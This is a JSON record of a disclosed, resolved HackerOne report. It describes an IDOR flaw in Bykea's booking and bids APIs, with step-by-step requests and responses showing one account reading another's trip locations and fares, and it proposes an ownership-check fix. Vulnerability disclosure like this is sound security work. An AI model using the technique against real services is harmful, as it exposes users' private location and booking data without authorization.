@@ -1,0 +1,123 @@
+{
+  "id": 2374730,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMzc0NzMw",
+  "url": "https://hackerone.com/reports/2374730",
+  "title": "Broken Access Control (IDOR) in Booking Detail and Bids Could Leads to Sensitive Information Disclosure",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2024-02-15T10:42:43.990Z",
+  "submitted_at": "2024-02-15T10:42:44.196Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "back2arie",
+    "url": "/back2arie",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/xaf9k0valp4oe3ib4wd97zdq51s7/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 69982,
+    "url": "https://hackerone.com/bykea",
+    "handle": "bykea",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/4ia4jt8tnhwqquinfmt8zycf5qdr/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/4ia4jt8tnhwqquinfmt8zycf5qdr/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Bykea",
+      "twitter_handle": "bykeapk",
+      "website": "https://bykea.com",
+      "about": "Bykea is an all in one app, helping to transform transportation and logistics through a technology-enabled platform based in Pakistan."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-06-13T04:36:06.142Z",
+  "bug_reporter_agreed_on_going_public_at": "2025-06-12T14:26:09.945Z",
+  "team_member_agreed_on_going_public_at": "2025-06-13T04:36:05.438Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\n\nDear Security Team,\n\nI hope this report finds you well,\n\nI would like to report an issue where a malicious user could see other users booking detail, bids information & bids config. The vulnerable URL endpoint are:\n\n```text\n1. GET https://api.bykea.net/api/v1/bookings/{{booking_id}}?_id={{user_id2}}&token_id={{access_token2}}\n2. GET https://api.bykea.net/api/v2/bids/{{booking_id}}?_id={{user_id2}}&token_id={{access_token2}}\n3. GET https://boleelagao.bykea.net/v1/config?lat={{latitute}}&lng={{longitude}}&service_code=23&trip_id={{booking_id}}\n```\n\nIn this case, the `booking_id` in the request URL is vulnerable to IDOR.\n\n## Steps To Reproduce:\n\n1. Create 2 users `attacker` and `victim`, in this case, the `attacker` is a passenger with username `█████████` & the `victim` is a passenger with username `██████████`.\n\n2. As `victim`, perform authentication to get `user_id` & `access_token`.\n3. As `victim`, create a new trip.\n\n    Request:\n\n    ```json\n    POST https://api.bykea.net/api/v1/trips/create\n\n    Headers:\n    User-Agent: BYKEA/1.0.169 (com.bykea.pk; build:21; iOS 15.8.0) Alamofire/1.0.169\n    X-App-Version: 1.0.169\n\n    Body:\n    {\n        \"advertisement_id\": \"REDACTED\",\n        \"token_id\": \"{{access_token}}\",\n        \"pickup_info\": {\n            \"lng\": 67.883339799999931,\n            \"lat\": 29.5500097,\n            \"address\": \"Ø³Ø¨Û, ØªØØµÛÙ Ø³Ø¨Û, Ø¶ÙØ¹ Ø³Ø¨Û, Ø³Ø¨Û ÚÙÛÚÙ, Ø¨ÙÙÚØ³ØªØ§Ù, 82000, Ù¾Ø§Ú©Ø³ØªØ§Ù\"\n        },\n        \"trip\": {\n            \"creator\": \"iOS\",\n            \"service_code\": 23,\n            \"lng\": 67.883339799999931,\n            \"lat\": 29.5500097,\n            \"customer_bid\": 75\n        },\n        \"dropoff_info\": {\n            \"address\": \"Kurak, ØªØØµÛÙ Ø³Ø¨Û, Ø¶ÙØ¹ Ø³Ø¨Û, Ø³Ø¨Û ÚÙÛÚÙ, Ø¨ÙÙÚØ³ØªØ§Ù, Ù¾Ø§Ú©Ø³ØªØ§Ù\",\n            \"lat\": 29.573396420702664,\n            \"lng\": 67.898040153086185\n        },\n        \"_id\": \"{{user_id}}\"\n    }\n   ```\n\n    Response:\n\n    ```json\n    {\n        \"code\": 200,\n        \"success\": true,\n        \"message\": \"Trip creation successful\",\n        \"data\": {\n            \"trip_id\": \"███████\",\n            \"trip_no\": \"PKX████████\",\n            \"passenger_id\": \"██████████\",\n            \"dt\": \"2024-02-15T13:49:44.841Z\",\n            \"link\": \"https://track.bykea.net/PKX██████\",\n            \"nc\": true\n        }\n    }\n    ```\n\n    We successfully created a new trip/ booking with id `██████`.\n\n4. Now as `attacker`, perform authentication to get `user_id2` & `access_token2`.\n5. As `attacker`, perform a request to the booking detail API endpoint.\n\n    Request:\n\n    ```json\n    GET https://api.bykea.net/api/v1/bookings/███?_id={{user_id2}}&token_id={{access_token2}}\n\n    Headers:\n    User-Agent: BYKEA/1.0.169 (com.bykea.pk; build:21; iOS 15.8.0) Alamofire/1.0.169\n    X-App-Version: 1.0.169\n    ```\n\n    Response:\n\n    ```json\n    {\n        \"code\": 200,\n        \"success\": true,\n        \"message\": \"Successfully loaded booking details\",\n        \"data\": {\n            \"_id\": \"█████\",\n            \"times\": {\n                \"total_est\": 480\n            },\n            \"distances\": {\n                \"total_est\": 3241\n            },\n            \"fare\": {\n                \"actual\": 75,\n                \"upper\": 80,\n                \"lower\": 66,\n                \"pre_actual\": 81\n            },\n            \"factors\": {\n                \"areaFactor\": 1,\n                \"profileFactor\": 0.92\n            },\n            \"shipper_feedback\": false,\n            \"picker_feedback\": false,\n            \"consignee_feedback\": false,\n            \"parcel_insurance\": false,\n            \"return_trip\": false,\n            \"trip_no\": \"PKX██████\",\n            \"trip_type\": \"Sawari\",\n            \"is_deleted\": false,\n            \"is_verified\": false,\n            \"est_fare\": \"81\",\n            \"est\": 75,\n            \"isDispatcher\": false,\n            \"isDropOffInitial\": false,\n            \"isPromo\": false,\n            \"est_distance\": 0,\n            \"creator_type\": \"iOS\",\n            \"is_cod\": false,\n            \"received_by_name\": \"\",\n            \"received_by_phone\": \"\",\n            \"received_by_cnic\": \"\",\n            \"decision\": [],\n            \"rule_ids\": [\n                \"███\",\n                \"█████████\"\n            ],\n            \"cart_items\": [],\n            \"customer_insurance\": false,\n            \"customer_voucher\": false,\n            \"paid_by\": \"shipper\",\n            \"passenger_id\": \"████████\",\n            \"trip_status_code\": 23,\n            \"curLat\": \"29.5500097\",\n            \"curLng\": \"67.88333979999993\",\n            \"pickup_lat\": \"29.5500097\",\n            \"pickup_lng\": \"67.88333979999993\",\n            \"start_address\": \"سبی, تحصیل سبی, ضلع سبی, سبی ڈویژن, بلوچستان, 82000, پاکستان\",\n            \"end_lat\": \"29.573396420702664\",\n            \"end_lng\": \"67.89804015308619\",\n            \"end_address\": \"Kurak, تحصیل سبی, ضلع سبی, سبی ڈویژن, بلوچستان, پاکستان\",\n            \"dropoff_lat\": \"29.573396420702664\",\n            \"dropoff_lng\": \"67.89804015308619\",\n            \"dropoff_address\": \"Kurak, تحصیل سبی, ضلع سبی, سبی ڈویژن, بلوچستان, پاکستان\",\n            \"customer_bid\": 75,\n            \"extra_params\": {\n                \"customer_app_version\": \"1.0.169\",\n                \"rebooking_count\": 0,\n                \"is_passenger_block\": false,\n                \"searchViaScore\": true\n            },\n            \"status\": \"cancelled\",\n            \"session\": \"█████\",\n            \"city\": \"643cb7378675551df33df5ab\",\n            \"edt\": \"2024-02-15T13:49:44.841Z\",\n            \"fare_factor\": 0.92,\n            \"order_id\": \"█████████\",\n            \"created_at\": \"2024-02-15T08:44:44.997Z\",\n            \"trip_number\": 170955617,\n            \"__v\": 0,\n            \"link\": \"https://track.bykea.net/PKX███████\",\n            \"rules\": {\n                \"onExpire\": \"sendToLoadboard\",\n                \"onCancelByPartner\": \"reopenOnLoadboard\",\n                \"onCancelByCustomer\": \"cancelOnLoadboard\"\n            },\n            \"updated_at\": \"2024-02-15T08:44:45.054Z\",\n            \"discounted_fare\": 81,\n            \"eligibleForDropoffDiscount\": true,\n            \"insurance_amount\": 0,\n            \"cancel_by\": \"Customer\",\n            \"cancel_reason\": \"No Partner is available\",\n            \"cancelled_at\": \"2024-02-15T08:45:21.657Z\"\n        }\n    }\n    ```\n\n    As we can see, we are able to retrieve the booking details of the `victim`.\n\n6. As `attacker`, retrieve bids information of the `victim`\n\n    Request:\n\n    ```json\n    GET https://api.bykea.net/api/v2/bids/████████?_id={{user_id2}}&token_id={{access_token2}}\n\n    Headers:\n    User-Agent: BYKEA/1.0.169 (com.bykea.pk; build:21; iOS 15.8.0) Alamofire/1.0.169\n    X-App-Version: 1.0.169\n    ```\n\n    Response:\n\n    ```json\n    {\n        \"code\": 200,\n        \"success\": true,\n        \"data\": {\n            \"bids\": [],\n            \"dt\": 1707988055001,\n            \"is_discounted\": false\n        }\n    }\n    ```\n\n    As we can see, we can retrieve bid information from the booking of the `victim`. In this case, it's empty since I canceled the booking, but in a real-life scenario, it should be filled up with bids from the partner/ driver.\n\n7. As `attacker`, retrieve bids config from the booking of the `victim`.\n\n    Request:\n\n    ```json\n    GET https://boleelagao.bykea.net/v1/config?lat=29.5500097&lng=67.88333979999993&service_code=23&trip_id=██████\n\n    Headers:\n    X-Lb-User-Id: {{user_id2}}\n    X-Lb-User-Token: {{access_token2}}\n    ```\n\n    Response:\n\n    ```json\n    {\n        \"code\": 200,\n        \"message\": \"success\",\n        \"data\": {\n            \"bid_values\": [\n                20,\n                40,\n                60,\n                80,\n                100,\n                120,\n                140,\n                160,\n                180,\n                200\n            ],\n            \"durations\": [\n                3,\n                3,\n                3\n            ],\n            \"hash\": \"██████████\"\n        }\n    }\n    ```\n\n## Mitigation\n\nFor the fix, this can be done by checking whether the booking/ trip `id` is owned by the logged-in user, by checking from their access token.\n\n## Supporting Material/References:\n\n- [[MITRE] CWE-639: Insecure Direct Object Reference (IDOR)](https://cwe.mitre.org/data/definitions/639.html)\n- [[PortSwigger] Insecure direct object references (IDOR)](https://portswigger.net/web-security/access-control/idor)\n\n## Impact\n\n1. Attacker could see sensitive information from other users booking details, such as `pickup location`, `drop-off location`, `phone`, `tracking`, etc.\n2. Attacker could see bids information from other users booking details.\n3. Attacker could see bids config from other users booking details.",
+  "weakness": {
+    "id": 55,
+    "name": "Insecure Direct Object Reference (IDOR)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 100,
+  "voters": [
+    "back2arie",
+    "stephenbonf",
+    "0x1git",
+    "orange303",
+    "sameer_ali",
+    "l0da",
+    "nyxtairo",
+    "viperblitzz",
+    "m4khn0",
+    "supermancyber",
+    "and 90 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 492396,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.bykea.net",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
